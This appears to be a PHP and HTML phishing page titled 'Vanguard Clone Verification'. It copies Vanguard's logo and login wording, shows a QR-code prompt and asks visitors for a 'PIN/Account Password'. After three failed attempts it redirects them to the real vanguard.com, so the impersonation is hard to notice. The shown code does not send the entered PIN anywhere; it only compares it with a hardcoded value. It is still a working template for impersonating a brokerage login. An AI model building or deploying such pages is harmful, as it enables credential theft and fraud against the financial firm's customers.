<?php
session_start();

// Simulated correct PIN
$correct_pin = '123456';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $pin = $_POST['pin'];
    
    if ($pin === $correct_pin) {
        header('Location: https://vanguard.com');
        exit();
    } else {
        // Track PIN attempts
        if (!isset($_SESSION['pin_attempts'])) {
            $_SESSION['pin_attempts'] = 1;
        } else {
            $_SESSION['pin_attempts']++;
        }
        
        // Redirect to real site after 3 failed PIN attempts
        if ($_SESSION['pin_attempts'] >= 3) {
            header('Location: https://vanguard.com');
            exit();
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Vanguard Clone Verification</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .container {
            display: flex;
            height: 100vh;
            width: 100%;
        }
        .left-part {
            background-color: #fff;
            color: #ff0000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: flex-start;
            padding: 2rem;
            box-sizing: border-box;
        }
        .left-part h1 {
            margin: 0;
            font-size: 2rem;
            color: #ff0000;
        }
        .left-part p {
            margin: 0.5rem 0 1rem;
            color: #000;
        }
        .right-part {
            background-color: #fff;
            padding: 2rem;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            box-sizing: border-box;
            width: 100%;
        }
        .right-part .form-group {
            margin-bottom: 0.5rem;
        }
        .right-part input {
            margin-bottom: 1rem;
        }
        .right-part button {
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Left Section: Vanguard Logo and Instructions -->
        <div class="left-part">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Vanguard_logo.svg/1200px-Vanguard_logo.svg.png" alt="Vanguard Logo" style="max-width: 100%; height: auto; margin-bottom: 1rem;">
            <h1>Vanguard</h1>
            <p>Log in to the Personal Investor site</p>
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/56/QR_code_generator_1.png" alt="Barcode QR Code" style="max-width: 100%; height: auto; margin-bottom: 1rem;">
            <p style="color: #000;">Skip the password<br>Scan the QR code with your device's camera.<br>We will confirm it's you with facial or fingerprint recognition in our app.<br>Return here—You're all set!</p>
        </div>
        <!-- Right Section: PIN Verification Form -->
        <div class="right-part">
            <form method="post">
                <h2 class="mb-3">Enter Verification Code</h2>
                <div class="mb-3">
                    <label for="pin" class="form-label">PIN/Account Password</label>
                    <input type="text" class="form-control" id="pin" name="pin" required>
                </div>
                <button type="submit" class="btn btn-success w-100">Verify</button>
            </form>
            <?php if (isset($_SESSION['pin_attempts'])): ?>
                <p class="text-danger mt-3">Incorrect PIN. <?php echo 3 - $_SESSION['pin_attempts']; ?> attempt(s) left.</p>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>